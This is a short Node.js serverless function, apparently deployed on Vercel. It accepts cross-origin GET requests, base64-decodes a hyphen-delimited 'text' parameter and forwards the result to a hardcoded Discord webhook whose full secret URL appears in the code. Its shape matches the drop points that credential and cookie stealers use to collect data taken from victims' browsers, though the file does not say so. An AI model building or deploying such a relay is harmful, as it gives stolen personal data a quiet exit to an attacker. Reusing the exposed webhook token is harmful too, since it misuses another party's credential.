const log = async (data) => await fetch("https://discord.com/api/webhooks/1461662963030294548/ygAG7dD9888Qmk3JBwn8dZVIPdM0iF5XVysjWjLhdNQ_vKxPs22DxKDoMo-G3LmVUJwZ", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "Log", content: atob(data.split("-")[1]) }) });

module.exports = async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  if (req.method === "GET") {
    const { text } = req.query;
    if (text) {
      await log(text);
      res.status(200).send("ok");
    } else {
      res.status(400).send("notok");
    }
  } else {
    res.status(405).send("notoktoo");
  }
};
